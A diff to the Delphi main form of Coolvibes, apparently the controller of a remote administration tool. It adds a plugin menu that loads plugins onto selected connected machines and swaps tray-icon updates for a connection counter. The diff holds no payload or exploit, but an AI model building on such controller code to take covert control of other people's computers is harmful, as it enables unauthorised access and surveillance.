@@ -23,7 +23,7 @@ uses
   Menus, IniFiles, IdThreadMgrDefault,
   IdAntiFreeze, IdTCPServer,
   UnitVariables, gnugettext, CommCtrl, MMSystem, IdThreadMgr,
-  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg;
+  IdAntiFreezeBase, IdBaseComponent, IdComponent, ImgList, jpeg, UnitPlugins;
 
 const
   WM_POP_MESSAGE = WM_USER + 1; //Mensaje usado para las notificaciones
@@ -118,6 +118,10 @@ type
     Avisos1: TMenuItem;
     N4: TMenuItem;
     Abrirdirectoriousuario1: TMenuItem;
+    Plugins1: TMenuItem;
+    N5: TMenuItem;
+    PluginManager1: TMenuItem;
+    Plugin: TMenuItem;
     procedure BtnEscucharClick(Sender: TObject);
     procedure ListViewConexionesContextPopup(Sender: TObject; MousePos: TPoint; var Handled: Boolean);
     procedure Abrir1Click(Sender: TObject);
@@ -160,6 +164,7 @@ type
     procedure VuelvaaaveractividadenelPC1Click(Sender: TObject);
     procedure Cambiedeventana1Click(Sender: TObject);
     procedure Abrirdirectoriousuario1Click(Sender: TObject);
+    procedure PluginClick(Sender: TObject);
   private
     ColumnaOrdenada, Columna: Integer;
     WndMethod: TWndMethod;
@@ -167,6 +172,7 @@ type
     TrayIconData: TNotifyIconData;
     //El record donde se guarda la información del icono del tray
     ServerSockets: array[0..9] of TIdTCPServer;
+    NumeroConexiones: Integer;//El número de servidores que hay conectados
     procedure OnPopMessage(var Msg: TMessage); message WM_POP_MESSAGE;
     procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
     procedure OnEventReceive(var Msg: TMessage); message WM_EVENT_MESSAGE;
@@ -306,10 +312,6 @@ begin
         h.Free;
       end;
       StatusBar.Panels[0].Text := _('Esperando conexiones');
-      //Aqui podriamos actualizar el icono del tray icon
-      TrayIconData.uFlags := 0;
-      StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool + #13#10 + _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count)); //numero de conexiones en el trayicon
-      Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
       StatusBar.Panels[1].Text := _('Puerto(s): ') + FormOpciones.EditPuerto.Text;
     end
   else
@@ -360,9 +362,6 @@ begin
       end;
       h.Free;
       StatusBar.Panels[0].Text := _('Escucha detenida');
-      TrayIconData.uFlags := 0;
-      StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool + #13#10 + _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count)); //numero de conexiones en el trayicon
-      Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
     end;
 
 end;
@@ -412,6 +411,7 @@ var
 begin
   if Athread.Data <> nil then
     begin
+      NumeroConexiones := NumeroConexiones-1;
       item := TListItem(Athread.Data);
 
       if item.SubItems.Objects[1] <> nil then
@@ -441,13 +441,9 @@ begin
   finally
     Athread.Connection.Server.Threads.UnlockList();
   end;
-  //Actualizamos tray icon
-  TrayIconData.uFlags := 0;
-  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool + #13#10 + _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count)); //numero de conexiones en el trayicon
-  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
 
-  FormEstadisticasConexiones.LabelNConexiones.Caption := _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count);
-  StatusBar.Panels[0].Text := _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count);
+  FormEstadisticasConexiones.LabelNConexiones.Caption := _('Número de conexiones: ') + IntToStr(NumeroConexiones);
+  StatusBar.Panels[0].Text := _('Número de conexiones: ') + IntToStr(NumeroConexiones);
 end;
 
 procedure TFormMain.ServerSocketExecute(AThread: TIdPeerThread);
@@ -551,6 +547,10 @@ begin
    para mostrar en el ListViewConexiones}
   if Copy(Buffer, 1, 8) = 'MAININFO' then
     begin
+      NumeroConexiones := NumeroConexiones+1;
+      FormEstadisticasConexiones.LabelNConexiones.Caption := _('Número de conexiones: ') + IntToStr(NumeroConexiones);
+      StatusBar.Panels[0].Text := _('Número de conexiones: ') + IntToStr(NumeroConexiones);
+
       Recibido := Copy(PChar(Buffer), 1, len);
       Delete(Recibido, 1, 9); //Borramos MAININFO|
 
@@ -639,13 +639,6 @@ begin
               end;
             Exit;
           end;
-
-  TrayIconData.uFlags := 0;
-  StrPCopy(TrayIconData.szTip, 'Coolvibes ' + VersionCool + #13#10 + _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count)); //numero de conexiones en el trayicon
-  Shell_NotifyIcon(NIM_MODIFY, @TrayIconData);
-
-  FormEstadisticasConexiones.LabelNConexiones.Caption := _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count);
-  StatusBar.Panels[0].Text := _('Número de conexiones: ') + IntToStr(Listviewconexiones.Items.Count);
 end;
 //Fin de eventos del ServerSocket
 
@@ -1461,6 +1454,22 @@ begin
       VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
       VentanaControl.CrearDirectoriosUsuario;
       ShellExecute(0, 'open', PChar(VentanaControl.DirUsuario), '', PChar(VentanaControl.DirUsuario), SW_NORMAL);
+
+      mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
+    end;
+end;
+
+procedure TFormMain.PluginClick(Sender: TObject);
+var
+  VentanaControl: TFormControl;
+  mslistviewitem: TListItem;
+begin
+  mslistviewitem := ListViewConexiones.Selected;
+  while Assigned(mslistviewitem) do
+    begin
+      VentanaControl := TFormControl(CrearVentanaControl(mslistviewitem));
+      
+      VentanaControl.CargarPlugin((Sender as Tmenuitem).Hint);
 
       mslistviewitem := ListViewConexiones.GetNextItem(mslistviewitem, sdAll, [isSelected]);
     end;
